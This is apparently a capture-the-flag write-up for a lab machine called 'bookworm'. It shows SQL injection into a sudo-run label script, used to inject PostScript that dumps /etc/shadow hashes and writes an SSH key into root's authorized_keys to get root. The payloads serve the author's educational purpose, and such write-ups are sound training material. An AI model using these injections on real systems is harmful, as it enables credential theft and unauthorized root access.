#!/usr/bin/env python3

import mysql.connector
import sys
import tempfile
import os
import subprocess

with open("/usr/local/labelgeneration/dbcreds.txt", "r") as cred_file:
    db_password = cred_file.read().strip()

cnx = mysql.connector.connect(user='bookworm', password=db_password,
                              host='127.0.0.1',
                              database='bookworm')

if len(sys.argv) != 2:
    print("Usage: genlabel [orderId]")
    exit()
```

```
cursor = cnx.cursor()
    query = "SELECT name, addressLine1, addressLine2, town, postcode, Orders.id as orderId, Users.id as userId FROM Orders LEFT JOIN Users On Orders.userId = Users.id WHERE Orders.id = %s" % sys.argv[1]

    cursor.execute(query)   
```
This is done in an insecure manner, and will be vulnerable to SQL injection. Let's we inject it

## SQL Injection

The Query SQL is:

```
SELECT name, addressLine1, addressLine2, town, postcode, Orders.id as orderId, Users.id as userId FROM Orders LEFT JOIN Users On Orders.userId = Users.id WHERE Orders.id = %s
```

I’ll give it a order that doesn’t exist (1111) and then use UNION injection to return a row of values I control:

sudo genlabel '1111 UNION SELECT 1,2,3,4,5,6,7;'

![](/images/bookworm/2024-01-25-11-43-31.png)

Nah Sql injection has been injected because i've used 1-7 numbers using Union Select and the output shows 1-7 numbers .

# Postscript Write file and read

# Read

```
neil@bookworm:~$ sudo genlabel '1111 UNION SELECT "test)
> /inputfile (/etc/shadow)
> /inputfile (/etc/shadow) (r) file def
> inputfile 10000 string readstring
> pop
> inputfile closefile
> /outfile (output.txt) (w) file def (the output on /etc/shadow will saved as output.txt)
> outfile exch  writestring
> outfile closefile 
> (test", 2,3,4,5,6,7' 
Fetching order...
Generating PostScript file...
Generating PDF (until the printer gets fixed...)
Documents available in /tmp/tmphllwqy1wprintgen
```

[File i/o in postscript
ost](https://stackoverflow.com/questions/25702146/file-i-o-in-postscript) By stackoverflow to how to read files and write

```
neil@bookworm:~$ cat output.txt
root:$6$X.PJezLobVQOLuGu$nDnaPx.G5/nXr9I7WI0h8Sw0vjeFcOChirHr1s0zNyaid7X5U26fB5MXOIQB/oR4fb7xiaN/.bXdfAkGwtXL6.:19387:0:99999:7:::
daemon:*:18375:0:99999:7:::
bin:*:18375:0:99999:7:::
sys:*:18375:0:99999:7:::
sync:*:18375:0:99999:7:::
games:*:18375:0:99999:7:::
man:*:18375:0:99999:7:::
lp:*:18375:0:99999:7:::
mail:*:18375:0:99999:7:::
news:*:18375:0:99999:7:::
uucp:*:18375:0:99999:7:::
proxy:*:18375:0:99999:7:::
www-data:*:18375:0:99999:7:::
backup:*:18375:0:99999:7:::
list:*:18375:0:99999:7:::
irc:*:18375:0:99999:7:::
gnats:*:18375:0:99999:7:::
nobody:*:18375:0:99999:7:::
systemd-network:*:18375:0:99999:7:::
systemd-resolve:*:18375:0:99999:7:::
systemd-timesync:*:18375:0:99999:7:::
messagebus:*:18375:0:99999:7:::
syslog:*:18375:0:99999:7:::
_apt:*:18375:0:99999:7:::
tss:*:18375:0:99999:7:::
uuidd:*:18375:0:99999:7:::
tcpdump:*:18375:0:99999:7:::
landscape:*:18375:0:99999:7:::
pollinate:*:18375:0:99999:7:::
usbmux:*:19386:0:99999:7:::
sshd:*:19386:0:99999:7:::
systemd-coredump:!!:19386::::::
lxd:!:19386::::::
frank:$6$iQwYpaCFHgzFXVbi$gAKLi4oKtDPb4uaCGW3RkabZ8DyAnQfxbaqhoiAeAsGmP776eOyQt6bvYPPUJ4PAe2PJPanzm3sH5KSiqzrlF.:19387:0:99999:7:::
neil:$6$rN642RtN9dzlaylh$/7DIfm9515mWvCPWM/wL/ANkJJPtKkUNURqcmu/VseEhLch1pQgX7c3l3ij2vA3MmM3PZV5WOrLM7u3gy2V3W1:19387:0:99999:7:::
mysql:!:19387:0:99999:7:::
fwupd-refresh:*:19479:0:99999:7:::
_laurel:!:19480::::::
james:$6$m07oa4vs5KUfYS/j$SjFJnikcpxhLK5wt3cOEE218N1Bfv4M3bQyhUspkepSBzefsAKCFpXbI.JS8N/p17IaYSgG0A217veas0iSC51:19513:0:99999:7:::
```


# Write

To get root ssh access we need upload our public keys into root `authorized_keys` file


```
#!/bin/bash
sudo /usr/local/bin/genlabel "0 UNION SELECT ')
/outfile (/root/.ssh/authorized_keys) (w) file def
outfile (ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIL8AxQTFZHrBYZ9uOIuCk8hfKlTI/wSJBXE5OlKEdnFQ kali@kali) writestring
outfile closefile(', '','','','','',''"
```
I've been created bash script for make work easier

```
neil@bookworm:~$ bash test.sh
Fetching order...
Generating PostScript file...
Generating PDF (until the printer gets fixed...)
Documents available in /tmp/tmp1xahbz52printgen
```

Successfully uploaded my public keys into root `authorized_keys` file . Let's login as root

![](/images/bookworm/2024-01-25-12-13-28.png)

It's Worked !!

```
root@bookworm:~# cat root.txt
ef423ea57cda3a276a8d0075cf7e1926
```
